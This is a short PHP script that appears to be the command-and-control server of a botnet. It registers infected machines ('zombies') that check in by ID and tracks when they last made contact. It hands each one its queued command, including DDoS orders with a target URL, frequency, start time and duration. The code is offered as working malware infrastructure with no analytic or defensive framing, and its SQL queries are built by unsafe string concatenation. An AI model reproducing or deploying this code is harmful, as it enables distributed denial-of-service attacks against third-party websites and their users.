<?php
include_once('config.php');

$zombieID = isset($_GET['id'])?$_GET['id']:'';
if(!empty($zombieID)) {
	
	include_once('setup_db_conn.php');
	
	$appendix = "";
	if(isset($_GET['dstate'])&&$_GET['dstate']=='done')
		$appendix = ", command='IDLE' ";
	$query = 'UPDATE zombies SET last_connect=NOW() '.$appendix.' WHERE id="'.htmlentities($zombieID).'";';
	mysqli_query($link,$query);
	
	$query = 'SELECT *, UNIX_TIMESTAMP(timestamp) AS ts FROM zombies WHERE id="'.htmlentities($zombieID).'";';
	$result = mysqli_query($link,$query);
	if($result && mysqli_num_rows($result)>0) {
		// Bot bekannt		
		$row = mysqli_fetch_assoc($result);
		echo $row["command"];
		if($row["command"] == "DDOS") {
			echo ' '.$row["target_url"].' '.$row["frequency"].' '.$row["ts"].' '.$row["duration"];
		}
		mysqli_free_result($result);
	} else {
		// neuer Bot
		$query = 'INSERT INTO zombies (id) VALUES ("'.htmlentities($zombieID).'");';
		mysqli_query($link,$query);
		echo "New Zombie added: ".$query;
	}
	mysqli_close($link);	
} else {
	header("Location: /404.html");
}
?>